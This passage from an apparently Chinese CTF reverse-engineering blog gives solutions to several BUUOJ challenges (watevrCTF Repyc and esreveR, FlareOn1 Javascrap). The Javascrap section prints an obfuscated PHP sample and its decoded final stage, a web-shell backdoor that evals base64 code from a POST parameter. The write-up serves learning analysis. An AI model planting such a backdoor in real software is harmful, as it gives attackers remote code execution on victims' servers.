class="string">&#x27;á×äÓâæíäàßåÉÛãåäÉÖÓÉäàÓÉÖÓåäÉÓÚÕæïèäßÙÚÉÛÓäàÙÔÉÓâæÉàÓÚÕÓÒÙæäàÉäàßåÉßåÉäàÓÉÚÓáÉ·Ôâ×ÚÕÓÔÉ³ÚÕæïèäßÙÚÉÅä×ÚÔ×æÔÉ×Úïá×ïåÉßÉÔÙÚäÉæÓ×ÜÜïÉà×âÓÉ×ÉÑÙÙÔÉâßÔÉÖãäÉßÉæÓ×ÜÜïÉÓÚÞÙïÉäàßåÉåÙÚÑÉßÉàÙèÓÉïÙãÉáßÜÜÉÓÚÞÙïÉßäÉ×åáÓÜÜ\x97ÉïÙãäãÖÓ\x9aÕÙÛ\x99á×äÕà©â«³£ï²ÕÔÈ·±â¨ë&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">    <span class="built_in">print</span> (<span class="built_in">chr</span>((<span class="built_in">ord</span>(c) + <span class="number">15</span>) ^ <span class="number">135</span>), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># watevr&#123;this_must_be_the_best_encryption_method_evr_henceforth_this_is_the_new_Advanced_Encryption_Standard_anyways_i_dont_really_have_a_good_vid_but_i_really_enjoy_this_song_i_hope_you_will_enjoy_it_aswell!_youtube.com/watch?v=E5yFcdPAGv0&#125;</span></span><br></pre></td></tr></table></figure><h1 id="FlareOn1-Javascrap"><a href="#FlareOn1-Javascrap" class="headerlink" title="[FlareOn1]Javascrap"></a>[FlareOn1]Javascrap</h1><p>一开始盯着网页看了半天，找不到题目在哪儿，就看了眼别人的wp，发现文件就在图片里</p><p>用010editor打开，找到php文件，导出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$terms=<span class="keyword">array</span>(<span class="string">&quot;M&quot;</span>, <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;f&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;z&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;s&quot;</span>, <span class="string">&quot;m&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;q&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;V&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;S&quot;</span>, <span class="string">&quot;X&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;9&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;P&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;U&quot;</span>, <span class="string">&quot;@&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;F&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;L&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;N&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;[&quot;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;J&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;A&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;k&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;K&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;R&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;|&quot;</span>);</span><br><span class="line">$order=<span class="keyword">array</span>(<span class="number">59</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">81</span>, <span class="number">76</span>, <span class="number">10</span>, <span class="number">28</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">28</span>, <span class="number">11</span>, <span class="number">76</span>, <span class="number">68</span>, <span class="number">50</span>, <span class="number">30</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">7</span>, <span class="number">63</span>, <span class="number">45</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">42</span>, <span class="number">24</span>, <span class="number">60</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">83</span>, <span class="number">43</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">90</span>, <span class="number">38</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">63</span>, <span class="number">58</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">83</span>, <span class="number">43</span>, <span class="number">87</span>, <span class="number">42</span>, <span class="number">24</span>, <span class="number">60</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">87</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">45</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">11</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">70</span>, <span class="number">63</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">81</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">63</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">83</span>, <span class="number">63</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">87</span>, <span class="number">23</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">75</span>, <span class="number">49</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">18</span>, <span class="number">50</span>, <span class="number">87</span>, <span class="number">42</span>, <span class="number">18</span>, <span class="number">90</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">81</span>, <span class="number">40</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">70</span>, <span class="number">63</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">40</span>, <span class="number">63</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">24</span>, <span class="number">63</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">40</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">49</span>, <span class="number">42</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">70</span>, <span class="number">42</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">75</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">58</span>, <span class="number">66</span>, <span class="number">3</span>, <span class="number">86</span>, <span class="number">27</span>, <span class="number">88</span>, <span class="number">77</span>, <span class="number">80</span>, <span class="number">38</span>, <span class="number">25</span>, <span class="number">40</span>, <span class="number">81</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">76</span>, <span class="number">81</span>, <span class="number">15</span>, <span class="number">50</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">24</span>, <span class="number">81</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">40</span>, <span class="number">90</span>, <span class="number">58</span>, <span class="number">81</span>, <span class="number">40</span>, <span class="number">30</span>, <span class="number">75</span>, <span class="number">1</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">75</span>, <span class="number">28</span>, <span class="number">7</span>, <span class="number">88</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">7</span>, <span class="number">90</span>, <span class="number">52</span>, <span class="number">80</span>, <span class="number">58</span>, <span class="number">5</span>, <span class="number">70</span>, <span class="number">63</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">66</span>, <span class="number">42</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">50</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">83</span>, <span class="number">43</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">90</span>, <span class="number">38</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">7</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">72</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">87</span>, <span class="number">70</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">7</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">42</span>, <span class="number">24</span>, <span class="number">60</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">17</span>, <span class="number">91</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">75</span>, <span class="number">49</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">45</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">90</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">81</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">40</span>, <span class="number">63</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">18</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">90</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">72</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">40</span>, <span class="number">63</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">24</span>, <span class="number">63</span>, <span class="number">87</span>, <span class="number">63</span>, <span class="number">12</span>, <span class="number">68</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">90</span>, <span class="number">25</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">18</span>, <span class="number">90</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">90</span>, <span class="number">38</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">75</span>, <span class="number">70</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">90</span>, <span class="number">58</span>, <span class="number">37</span>, <span class="number">91</span>, <span class="number">63</span>, <span class="number">75</span>, <span class="number">11</span>, <span class="number">79</span>, <span class="number">28</span>, <span class="number">27</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">42</span>, <span class="number">23</span>, <span class="number">88</span>, <span class="number">30</span>, <span class="number">35</span>, <span class="number">47</span>, <span class="number">59</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">35</span>, <span class="number">68</span>, <span class="number">38</span>, <span class="number">63</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">38</span>, <span class="number">45</span>, <span class="number">30</span>, <span class="number">81</span>, <span class="number">15</span>, <span class="number">50</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">24</span>, <span class="number">81</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">40</span>, <span class="number">90</span>, <span class="number">58</span>, <span class="number">81</span>, <span class="number">40</span>, <span class="number">30</span>, <span class="number">75</span>, <span class="number">1</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">75</span>, <span class="number">28</span>, <span class="number">23</span>, <span class="number">75</span>, <span class="number">77</span>, <span class="number">1</span>, <span class="number">28</span>, <span class="number">1</span>, <span class="number">43</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">75</span>, <span class="number">81</span>, <span class="number">40</span>, <span class="number">30</span>, <span class="number">75</span>, <span class="number">1</span>, <span class="number">27</span>, <span class="number">75</span>, <span class="number">77</span>, <span class="number">35</span>, <span class="number">47</span>, <span class="number">59</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">73</span>, <span class="number">21</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">51</span>, <span class="number">40</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">91</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">77</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">91</span>, <span class="number">70</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">49</span>, <span class="number">51</span>, <span class="number">4</span>, <span class="number">51</span>, <span class="number">91</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">70</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">91</span>, <span class="number">91</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">51</span>, <span class="number">70</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">91</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">51</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">91</span>, <span class="number">91</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">51</span>, <span class="number">70</span>, <span class="number">21</span>, <span class="number">47</span>, <span class="number">93</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">58</span>, <span class="number">82</span>, <span class="number">59</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">82</span>, <span class="number">59</span>, <span class="number">71</span>, <span class="number">71</span>, <span class="number">29</span>, <span class="number">29</span>, <span class="number">47</span>);</span><br><span class="line">$do_me=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($order);$i++)&#123;</span><br><span class="line">$do_me=$do_me.$terms[$order[$i]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($do_me); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用国赛学来的方法，直接把 <code>eval</code> 改成 <code>print</code> 然后放在线环境运行一下，得到第二份脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_= \<span class="string">&#x27;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9\&#x27;;</span></span><br><span class="line"><span class="string">$__=\&#x27;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7\&#x27;;</span></span><br><span class="line"><span class="string">$___=&quot;\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65&quot;;</span></span><br><span class="line"><span class="string">eval($___($__));</span></span><br></pre></td></tr></table></figure><p>这次好像在线环境运行不了，看一下字符串都是什么，复制到python里，发现 <code>$___</code> 是 <code>base64_decode</code></p><p>于是把 <code>$__</code> 解码一下，得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$code=base64_decode($_);<span class="keyword">eval</span>($code);</span><br></pre></td></tr></table></figure><p>所以只要解码 <code>$_</code> 就可以了，得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&quot;\\97\\49\\49\\68\\x4F\\84\\116\\x68\\97\\x74\\x44\\x4F\\x54\\x6A\\97\\x76\\x61\\x35\\x63\\x72\\97\\x70\\x41\\84\\x66\\x6C\\97\\x72\\x65\\x44\\65\\x53\\72\\111\\110\\68\\79\\84\\99\\x6F\\x6D&quot;</span>])) &#123; <span class="keyword">eval</span>(base64_decode($_POST[<span class="string">&quot;\\97\\49\\x31\\68\\x4F\\x54\\116\\104\\x61\\116\\x44\\79\\x54\\106\\97\\118\\97\\53\\x63\\114\\x61\\x70\\65\\84\\102\\x6C\\x61\\114\\101\\x44\\65\\x53\\72\\111\\x6E\\x44\\x4F\\84\\99\\x6F\\x6D&quot;</span>])); &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>POST请求是什么不太清楚，但看到这些字符好像都在可见字符范围内，所以直接转成string，得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;a11DOTthatDOTjava5crapATflareDASHonDOTcom&#x27;</span></span><br></pre></td></tr></table></figure><p>把 <code>DOT</code>，<code>AT</code>，<code>DASH</code> 都转成对应的符号，就拿到flag了</p><h1 id="watevrCTF-2019-esreveR"><a href="#watevrCTF-2019-esreveR" class="headerlink" title="[watevrCTF 2019]esreveR"></a>[watevrCTF 2019]esreveR</h1><p>用ida打开后，发现大量与输入无关的计算，于是决定先静态跟踪一下输入，然后再动调看过程数据</p><p>和输入有关的大概是这些（动调后写的wp，所以基地址改变了）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fgets(s, n[<span class="number">0</span>], <span class="built_in">stdin</span>);</span><br><span class="line">v8 = sub_5578E4A20943(n[<span class="number">0</span>]);</span><br><span class="line">*(_QWORD *)n = sub_5578E4A20996(v14);</span><br><span class="line"><span class="keyword">if</span> ( *(_QWORD *)n != v8 )</span><br><span class="line">&#123;</span><br><span class="line">  v11 = sub_5578E4A209E9(<span class="number">4521</span>);</span><br><span class="line">  <span class="keyword">if</span> ( s != (<span class="keyword">char</span> *)v11 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = sub_5578E4A212D8((__int64)s, v15, v10, v9, v11, v13);</span><br><span class="line">    <span class="keyword">if</span> ( v4 != v15 * ((v12 ^ v13) - *(_QWORD *)n) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Congratulations! You reversed the reversed reverse!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现输入只要输入的地址不等于一个数，然后通过某个判断就行，于是再进到判断前的函数</p><p>会看到一个输入参数很多的函数，进去看一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  v58 = a1 == *a57;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != a57[<span class="number">1</span>] )</span><br><span class="line">    v58 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a3 != a57[<span class="number">2</span>] )</span><br><span class="line">    v58 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a4 != a57[<span class="number">3</span>] )</span><br><span class="line">    v58 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a5 != a57[<span class="number">4</span>] )</span><br><span class="line">    v58 = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 以下省略</span></span><br></pre></td></tr></table></figure><p>输入了57个参数，而且就是判断是否相同的，相同就返回1，否则返回0</p><p>于是猜测这里就是最终的验证函数</p><p>中间经过了一系列动调，确定其它的过程没什么影响，于是在进入函数前下个断点，然后直接去rsp的地址里找比较的数据</p><p>最后的内存数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[stack]:00007FFF9B4402F0 dq &#39;&#123;&#39;, &#39;e&#39;, &#39;s&#39;, &#39;r&#39;, &#39;e&#39;, &#39;v&#39;, &#39;e&#39;, &#39;r&#39;, &#39;_&#39;, &#39;r&#39;, &#39;e&#39;, &#39;v&#39;, &#39;e&#39;, &#39;r&#39;, &#39;s&#39;, &#39;e&#39;</span><br><span class="line">[stack]:00007FFF9B4402F0 dq &#39;d&#39;, &#39;_&#39;, &#39;y&#39;, &#39;o&#39;, &#39;u&#39;, &#39;t&#39;, &#39;u&#39;, &#39;b&#39;, &#39;e&#39;, &#39;.&#39;, &#39;c&#39;, &#39;o&#39;, &#39;m&#39;, &#39;&#x2F;&#39;, &#39;w&#39;, &#39;a&#39;</span><br><span class="line">[stack]:00007FFF9B4402F0 dq &#39;t&#39;, &#39;c&#39;, &#39;h&#39;, &#39;?&#39;, &#39;v&#39;, &#39;&#x3D;&#39;, &#39;I&#39;, &#39;8&#39;, &#39;i&#39;, &#39;j&#39;, &#39;b&#39;, &#39;4&#39;, &#39;Z&#39;, &#39;e&#39;, &#39;e&#39;, &#39;5&#39;</span><br><span class="line">[stack]:00007FFF9B4402F0 dq &#39;E&#39;, &#39;&#125;&#39;</span><br></pre></td></tr></table></figure><p>连接起来就是flag了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;esrever_reversed_youtube.com&#x2F;watch?v&#x3D;I8ijb4Zee5E&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;看前一天200分就第三了，正好好久没刷BUU，打算冲一下分，随便选几道题&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;[NPUCTF2020]BasicASM —— 简单汇编&lt;/li&gt;
&lt;li&gt;[watevrCTF 2019]Repyc —— python语言vm&lt;/li&gt;
&lt;li&gt;[FlareOn1]Javascrap —— php语言病毒&lt;/li&gt;
&lt;li&gt;[watevrCTF 2019]esreveR —— 简单动调&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/categories/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/categories/CTF/Reverse/"/>
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/tags/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/tags/Reverse/"/>
    
    <category term="BUUOJ" scheme="https://s0uthwood.github.io/tags/BUUOJ/"/>
    
  </entry>
  
  <entry>
    <title>cryptohack</title>
    <link href="https://s0uthwood.github.io/2021/05/20/cryptohack/"/>
    <id>https://s0uthwood.github.io/2021/05/20/cryptohack/</id>
    <published>2021-05-19T17:51:42.000Z</published>
    <updated>2021-05-19T17:54:25.016Z</updated>
    
